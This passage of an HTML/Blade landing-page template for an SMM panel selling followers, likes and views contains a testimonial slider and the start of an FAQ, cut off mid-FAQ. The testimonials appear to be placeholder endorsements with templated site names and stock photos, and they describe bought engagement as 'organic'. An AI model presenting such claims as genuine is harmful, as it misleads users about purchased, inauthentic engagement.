                                                                    style="font-weight: bold">Watch your followers,
                                                                    likes, and views grow quickly! Enjoy consistent,
                                                                    natural-looking engagement and reliable results.
                                                                    🌟</strong></span></p>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_99">
                    <div class="block-bg">
                        <div class="bg-image"></div>
                    </div>
                    <div class="container">
                        <div class="header-with-text ">
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__title">
                                        <h2 class="text-center"><span style="text-align: CENTER"><strong
                                                    style="font-weight: bold">What Our Users Are Saying About {{ $settings['site_name'] ?? config('app.name') }}
                                                    💬</strong></span></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__description">
                                        <p class="text-center">From influencers to agencies, thousands of users rely on
                                            us to strengthen their online presence. Here’s what they have to say about
                                            our services.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_93">
                    <div class="block-bg">
                        <div class="bg-image"></div>
                    </div>
                    <div class="block-divider-bottom">
                        <svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
                            <pattern id="divider-block-93-bottom" patternUnits="userSpaceOnUse" width="800" height="350"
                                x="40">
                                <g>
                                    <path fill="currentColor" fill-opacity=".2" fill-rule="evenodd"
                                        d="M360 80c22.091 0 40-17.909 40-40S382.091 0 360 0s-40 17.909-40 40 17.909 40 40 40Zm-1.623-26.647-10.588-10.018A8.94 8.94 0 0 1 345 36.833v-.344c0-4.151 2.959-7.69 6.996-8.373a8.307 8.307 0 0 1 7.301 2.37l.703.712.703-.713a8.307 8.307 0 0 1 7.301-2.37c4.037.684 6.996 4.223 6.996 8.374v.344a8.94 8.94 0 0 1-2.789 6.502l-10.588 10.018a2.36 2.36 0 0 1-3.246 0ZM240 120c0 22.091-17.909 40-40 40s-40-17.909-40-40 17.909-40 40-40 40 17.909 40 40Zm-52.211 3.335 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502ZM640 120c0 22.091-17.909 40-40 40s-40-17.909-40-40 17.909-40 40-40 40 17.909 40 40Zm-52.211 3.335 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502ZM840 240c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Zm-1.623-26.647-10.588-10.018a8.94 8.94 0 0 1-2.789-6.502v-.345c0-4.15 2.959-7.689 6.996-8.372a8.305 8.305 0 0 1 7.301 2.369l.703.713.703-.713a8.305 8.305 0 0 1 7.301-2.369c4.037.683 6.996 4.222 6.996 8.372v.345a8.94 8.94 0 0 1-2.789 6.502l-10.588 10.018a2.362 2.362 0 0 1-3.246 0Z"
                                        clip-rule="evenodd"></path>
                                    <path fill="currentColor" fill-opacity=".2"
                                        d="M680 240c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Z">
                                    </path>
                                    <path fill="currentColor" fill-opacity=".2" fill-rule="evenodd"
                                        d="M360 240c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Zm-1.623-26.647-10.588-10.018a8.94 8.94 0 0 1-2.789-6.502v-.345c0-4.15 2.959-7.689 6.996-8.372a8.305 8.305 0 0 1 7.301 2.369l.703.713.703-.713a8.305 8.305 0 0 1 7.301-2.369c4.037.683 6.996 4.222 6.996 8.372v.345a8.94 8.94 0 0 1-2.789 6.502l-10.588 10.018a2.362 2.362 0 0 1-3.246 0Z"
                                        clip-rule="evenodd"></path>
                                    <path fill="currentColor" fill-opacity=".2"
                                        d="M120 240c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Z">
                                    </path>
                                    <path fill="currentColor" fill-opacity=".2" fill-rule="evenodd"
                                        d="M720 40c0 22.091-17.909 40-40 40s-40-17.909-40-40 17.909-40 40-40 40 17.909 40 40Zm-52.211 3.335 10.588 10.018a2.36 2.36 0 0 0 3.246 0l10.588-10.018A8.94 8.94 0 0 0 695 36.833v-.344c0-4.151-2.959-7.69-6.996-8.373a8.307 8.307 0 0 0-7.301 2.37l-.703.712-.703-.713a8.307 8.307 0 0 0-7.301-2.37C667.959 28.8 665 32.339 665 36.49v.344a8.94 8.94 0 0 0 2.789 6.502Z"
                                        clip-rule="evenodd"></path>
                                    <path fill="currentColor" fill-rule="evenodd"
                                        d="M800 117c0 22.091-17.909 40-40 40s-40-17.909-40-40 17.909-40 40-40 40 17.909 40 40Zm-52.211 3.335 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502Z"
                                        clip-rule="evenodd"></path>
                                    <path fill="currentColor"
                                        d="M40 160c22.091 0 40-17.909 40-40 0 22.091 17.909 40 40 40s40-17.909 40-40-17.909-40-40-40-40 17.909-40 40c0-22.091-17.909-40-40-40S0 97.909 0 120s17.909 40 40 40Zm0 80c-22.091 0-40-17.909-40-40s17.909-40 40-40 40 17.909 40 40-17.909 40-40 40Zm40 40c0 22.091-17.909 40-40 40S0 302.091 0 280s17.909-40 40-40 40 17.909 40 40Zm80 0c0-22.091-17.909-40-40-40s-40 17.909-40 40 17.909 40 40 40 40-17.909 40-40Z">
                                    </path>
                                    <path fill="currentColor" fill-rule="evenodd"
                                        d="M200 240c-22.091 0-40 17.909-40 40s17.909 40 40 40 40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40-17.909-40-40-40-40 17.909-40 40c0-22.091-17.909-40-40-40 22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40c-22.091 0-40 17.909-40 40 0-22.091-17.909-40-40-40s-40 17.909-40 40c0-22.091-17.909-40-40-40 22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40c0-22.091-17.909-40-40-40 22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40c0-22.091-17.909-40-40-40s-40 17.909-40 40c0-22.091-17.909-40-40-40s-40 17.909-40 40 17.909 40 40 40 40-17.909 40-40c0 22.091 17.909 40 40 40s40-17.909 40-40c0 22.091 17.909 40 40 40-22.091 0-40 17.909-40 40s17.909 40 40 40c-22.091 0-40 17.909-40 40 0-22.091-17.909-40-40-40s-40 17.909-40 40c0-22.091-17.909-40-40-40s-40 17.909-40 40c0-22.091-17.909-40-40-40 22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40c0-22.091-17.909-40-40-40s-40 17.909-40 40 17.909 40 40 40Zm0 0c22.091 0 40 17.909 40 40 0-22.091 17.909-40 40-40-22.091 0-40-17.909-40-40 0 22.091-17.909 40-40 40Zm320 0c22.091 0 40-17.909 40-40 0 22.091 17.909 40 40 40-22.091 0-40 17.909-40 40 0-22.091-17.909-40-40-40Zm-332.211-36.665 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502Zm240-80 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502Zm80 80 10.588 10.018a2.362 2.362 0 0 0 3.246 0l10.588-10.018a8.94 8.94 0 0 0 2.789-6.502v-.345c0-4.15-2.959-7.689-6.996-8.372a8.305 8.305 0 0 0-7.301 2.369l-.703.713-.703-.713a8.305 8.305 0 0 0-7.301-2.369c-4.037.683-6.996 4.222-6.996 8.372v.345a8.94 8.94 0 0 0 2.789 6.502Z"
                                        clip-rule="evenodd"></path>
                                    <path fill="currentColor"
                                        d="M680 160c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Zm280-43c0 22.091-17.909 40-40 40s-40-17.909-40-40 17.909-40 40-40 40 17.909 40 40Zm-40 120c22.091 0 40-17.909 40-40s-17.909-40-40-40-40 17.909-40 40 17.909 40 40 40Zm0 0c-22.091 0-40 17.909-40 40s17.909 40 40 40 40-17.909 40-40-17.909-40-40-40Z">
                                    </path>
                                </g>
                            </pattern>
                            <rect width="100%" height="100%" fill="url(#divider-block-93-bottom)"></rect>
                        </svg>
                    </div>
                    <div class="container">
                        <div class="reviews-slider ">
                            <div class="reviews-slider">
                                <div data-slider="1"
                                    data-slider-options="{'dots':true,'infinite':true,'speed':500,'autoplay':true,'autoplaySpeed':5000,'slidesToShow':2,'slidesToScroll':1,'responsive':[{'breakpoint':991,'settings':{'slidesToShow':1,'slidesToScroll':1}}],'arrows':true,'rtl':false}"
                                    class="slick-initialized slick-slider slick-dotted"><button
                                        class="slick-prev slick-arrow" aria-label="Previous" type="button"
                                        style="">Previous</button>
                                    <div class="slick-list draggable">
                                        <div class="slick-track"
                                            style="opacity: 1; width: 6336px; transform: translate3d(-2880px, 0px, 0px);">
                                            <div class="slick-slide slick-cloned" data-slick-index="-1" id=""
                                                aria-hidden="true" style="width: 576px;" tabindex="-1">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 10px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_3.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 8px;">
                                                                <p><strong>Aisha Rahman — TikTok Influencer</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>My TikTok videos were getting buried. After using
                                                                    {{ $settings['site_name'] ?? config('app.name') }}, I went from 1,200 to 14,000 followers in 2
                                                                    weeks and my views skyrocketed. Real engagement,
                                                                    fast delivery, prices I can actually afford — 10/10.
                                                                </p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="slick-slide" data-slick-index="0" aria-hidden="true"
                                                style="width: 576px;" tabindex="-1" role="tabpanel" id="slick-slide00"
                                                aria-describedby="slick-slide-control00">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                                                                                                                                                     padding-top: 16px;                                                                  padding-left: 16px;                                  padding-right: 16px;                                                                                                                                                                                                                                                                                                                                 ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 16px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_2.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 10px;">
                                                                <p><strong>Daniel Mitchell — Digital Marketing Agency
                                                                        Owner</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>{{ $settings['site_name'] ?? config('app.name') }} made scaling my clients' campaigns effortless.
                                                                    We grew one client's Instagram from 2,400 to 18,000
                                                                    followers in just 4 weeks. The platform is reliable,
                                                                    prices are unbeatable, and results are consistent
                                                                    every time.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="slick-slide" data-slick-index="1" aria-hidden="true"
                                                style="width: 576px;" tabindex="-1" role="tabpanel" id="slick-slide01"
                                                aria-describedby="slick-slide-control01">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                                                                                                                                                     padding-top: 16px;                                                                  padding-left: 16px;                                  padding-right: 16px;                                                                                                                                                                                                                                                                                                                                 ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 16px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_2.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 10px;">
                                                                <p><strong>Marco Silva — Facebook Ads
                                                                        Specialist</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>Managing multiple Facebook pages for clients used to
                                                                    be a nightmare. I grew one client's page from 1,500
                                                                    to 22,000 likes in a month. Fast, reliable, and the
                                                                    cheapest SMM panel I've ever used.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="slick-slide" data-slick-index="2" aria-hidden="true"
                                                style="width: 576px;" tabindex="-1" role="tabpanel" id="slick-slide02"
                                                aria-describedby="slick-slide-control02">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                     background: var(--color-id-49);                                  color: var(--text-dark);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 16px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_1.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 8px;">
                                                                <p><strong>Sarah Lawrence — E-commerce Business
                                                                        Owner</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>I was skeptical at first, but {{ $settings['site_name'] ?? config('app.name') }} delivered beyond
                                                                    my expectations. My product page went from 300 to
                                                                    9,500 followers in 3 weeks and engagement felt
                                                                    completely organic. It's the only panel I trust.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="slick-slide" data-slick-index="3" aria-hidden="true"
                                                style="width: 576px;" tabindex="-1" role="tabpanel" id="slick-slide03"
                                                aria-describedby="slick-slide-control03">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                     background: var(--color-id-49);                                  color: var(--text-dark);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 16px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_1.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 8px;">
                                                                <p><strong>James Carter — YouTube Content
                                                                        Creator</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>I had been stuck at 800 subscribers for months. This
                                                                    platfrom helped me reach 11,000 subscribers in just
                                                                    5 weeks. My videos started ranking better and the
                                                                    watch time boost made a huge difference. Best
                                                                    investment I've made for my channel.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="slick-slide slick-current slick-active" data-slick-index="4"
                                                aria-hidden="false" style="width: 576px;" role="tabpanel"
                                                id="slick-slide04" aria-describedby="slick-slide-control04">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 10px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_3.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 8px;">
                                                                <p><strong>Aisha Rahman — TikTok Influencer</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>My TikTok videos were getting buried. After using
                                                                    {{ $settings['site_name'] ?? config('app.name') }}, I went from 1,200 to 14,000 followers in 2
                                                                    weeks and my views skyrocketed. Real engagement,
                                                                    fast delivery, prices I can actually afford — 10/10.
                                                                </p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="slick-slide slick-cloned" data-slick-index="5" id=""
                                                aria-hidden="true" style="width: 576px;" tabindex="-1">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                                                                                                                                                     padding-top: 16px;                                                                  padding-left: 16px;                                  padding-right: 16px;                                                                                                                                                                                                                                                                                                                                 ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 16px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_2.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 10px;">
                                                                <p><strong>Daniel Mitchell — Digital Marketing Agency
                                                                        Owner</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>{{ $settings['site_name'] ?? config('app.name') }} made scaling my clients' campaigns effortless.
                                                                    We grew one client's Instagram from 2,400 to 18,000
                                                                    followers in just 4 weeks. The platform is reliable,
                                                                    prices are unbeatable, and results are consistent
                                                                    every time.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="slick-slide slick-cloned" data-slick-index="6" id=""
                                                aria-hidden="true" style="width: 576px;" tabindex="-1">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                                                                                                                                                     padding-top: 16px;                                                                  padding-left: 16px;                                  padding-right: 16px;                                                                                                                                                                                                                                                                                                                                 ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 16px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_2.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 10px;">
                                                                <p><strong>Marco Silva — Facebook Ads
                                                                        Specialist</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>Managing multiple Facebook pages for clients used to
                                                                    be a nightmare. I grew one client's page from 1,500
                                                                    to 22,000 likes in a month. Fast, reliable, and the
                                                                    cheapest SMM panel I've ever used.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="slick-slide slick-cloned" data-slick-index="7" id=""
                                                aria-hidden="true" style="width: 576px;" tabindex="-1">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                     background: var(--color-id-49);                                  color: var(--text-dark);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 16px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_1.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 8px;">
                                                                <p><strong>Sarah Lawrence — E-commerce Business
                                                                        Owner</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>I was skeptical at first, but {{ $settings['site_name'] ?? config('app.name') }} delivered beyond
                                                                    my expectations. My product page went from 300 to
                                                                    9,500 followers in 3 weeks and engagement felt
                                                                    completely organic. It's the only panel I trust.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="slick-slide slick-cloned" data-slick-index="8" id=""
                                                aria-hidden="true" style="width: 576px;" tabindex="-1">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                     background: var(--color-id-49);                                  color: var(--text-dark);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 16px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_1.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 8px;">
                                                                <p><strong>James Carter — YouTube Content
                                                                        Creator</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>I had been stuck at 800 subscribers for months. This
                                                                    platfrom helped me reach 11,000 subscribers in just
                                                                    5 weeks. My videos started ranking better and the
                                                                    watch time boost made a huge difference. Best
                                                                    investment I've made for my channel.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="slick-slide slick-cloned" data-slick-index="9" id=""
                                                aria-hidden="true" style="width: 576px;" tabindex="-1">
                                                <div>
                                                    <div class="reviews-slider__slide"
                                                        style="width: 100%; display: inline-block;">
                                                        <div class="card"
                                                            style="
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ">
                                                            <div class="reviews-slider__slide-photo"
                                                                style="margin-bottom: 10px; justify-content: flex-start;">
                                                                <div class="reviews-slider__slide-avatar"
                                                                    style="background-image: url(https://storage.perfectcdn.com/hx1lyd/photo_3.png);">
                                                                </div>
                                                            </div>
                                                            <div class="reviews-slider__slide-name"
                                                                style="padding-left: 0px; padding-right: 0px; margin-bottom: 8px;">
                                                                <p><strong>Aisha Rahman — TikTok Influencer</strong></p>
                                                            </div>
                                                            <div class="reviews-slider__slide-description"
                                                                style="padding-left: 0px; padding-right: 0px;">
                                                                <p>My TikTok videos were getting buried. After using
                                                                    {{ $settings['site_name'] ?? config('app.name') }}, I went from 1,200 to 14,000 followers in 2
                                                                    weeks and my views skyrocketed. Real engagement,
                                                                    fast delivery, prices I can actually afford — 10/10.
                                                                </p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div><button class="slick-next slick-arrow" aria-label="Next" type="button"
                                        style="">Next</button>
                                    <ul class="slick-dots" style="" role="tablist">
                                        <li class="" role="presentation"><button type="button" role="tab"
                                                id="slick-slide-control00" aria-controls="slick-slide00"
                                                aria-label="1 of 5" tabindex="-1">1</button></li>
                                        <li role="presentation"><button type="button" role="tab"
                                                id="slick-slide-control01" aria-controls="slick-slide01"
                                                aria-label="2 of 5" tabindex="-1">2</button></li>
                                        <li role="presentation"><button type="button" role="tab"
                                                id="slick-slide-control02" aria-controls="slick-slide02"
                                                aria-label="3 of 5" tabindex="-1">3</button></li>
                                        <li role="presentation"><button type="button" role="tab"
                                                id="slick-slide-control03" aria-controls="slick-slide03"
                                                aria-label="4 of 5" tabindex="-1">4</button></li>
                                        <li class="slick-active" role="presentation"><button type="button" role="tab"
                                                id="slick-slide-control04" aria-controls="slick-slide04"
                                                aria-label="5 of 5" tabindex="0" aria-selected="true">5</button></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_98">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="header-with-text ">
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__title">
                                        <h2 class="text-center"><span style="text-align: CENTER">Top 10 Most Asked
                                                Questions</span></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__description">
                                        <p class="text-center"><span style="font-size: 16px"><span
                                                    style="text-align: CENTER"><strong style="font-weight: bold">Our
                                                        team has selected some of the most common questions about SMM
                                                        panels and provided clear answers to help you understand
                                                        everything easily.</strong></span></span></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_97">
                    <div class="block-bg">
                        <div class="bg-image"></div>
                    </div>
                    <div class="container">
                        <div class="faq ">
                            <div class="row justify-content-center">
                                <div class="col-lg-8">
                                    <div class="grid-ed grid-1"
                                        style="--gapSizeX: 30px; --gapSizeY: 15px; --overlapX: 0px; --overlapY: 0px; --rowJustify: flex-start; --rowAlign: stretch;">
                                        <div class="row-ed">
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                      border-color: var(--color-id-48);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-1"
                                                                aria-expanded="false" aria-controls="#faq-block-97-1">
                                                                <div class="faq-block__header-title">
                                                                    <h4>What is {{ $settings['site_name'] ?? config('app.name') }}?</h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: var(--color-id-49);"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-1">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p>{{ $settings['site_name'] ?? config('app.name') }} is a professional Social Media Marketing
                                                                        (SMM) panel offering affordable, high-quality
                                                                        services to help you grow on platforms like
                                                                        Instagram, TikTok, YouTube, Facebook, and more.
                                                                    </p>
                                                                    <p>We support influencers, resellers, and brands by
                                                                        delivering fast, safe growth with genuine
                                                                        engagement.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                      border-color: var(--color-id-48);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-2"
                                                                aria-expanded="false" aria-controls="#faq-block-97-2">
                                                                <div class="faq-block__header-title">
                                                                    <h4>How does {{ $settings['site_name'] ?? config('app.name') }} work?</h4>
                                                                </div>
                                                                <div class="faq-block__header-icon">
                                                                    <div class="style-text-dark faq-block__icon"
                                                                        style="color: var(--color-id-49);"></div>
                                                                </div>
                                                            </div>
                                                            <div class="faq-block__body collapse" id="faq-block-97-2">
                                                                <div class="faq-block__body-description"
                                                                    style="padding-top: 8px">
                                                                    <p>It’s super simple!</p>
                                                                    <ol>
                                                                        <li>Create your free account.</li>
                                                                        <li>Add funds using your preferred payment
                                                                            method.</li>
                                                                        <li>Choose a service (followers, likes, views,
                                                                            etc.).</li>
                                                                        <li>Place your order and watch your results grow
                                                                            instantly.</li>
                                                                    </ol>
                                                                    <p>Everything is fully automated and
                                                                        beginner-friendly.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-ed md:col-ed-span-12">
                                                <div class="col-ed-elements">
                                                    <div class="col-ed-elements--element">
                                                        <div class="w-100 card"
                                                            style="
                                     background: none;                                                                          color: inherit;                                      border-color: var(--color-id-48);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ">
                                                            <div class="faq-block__header collapsed"
                                                                data-toggle="collapse" data-target="#faq-block-97-3"
                                                                aria-expanded="false" aria-controls="#faq-block-97-3">
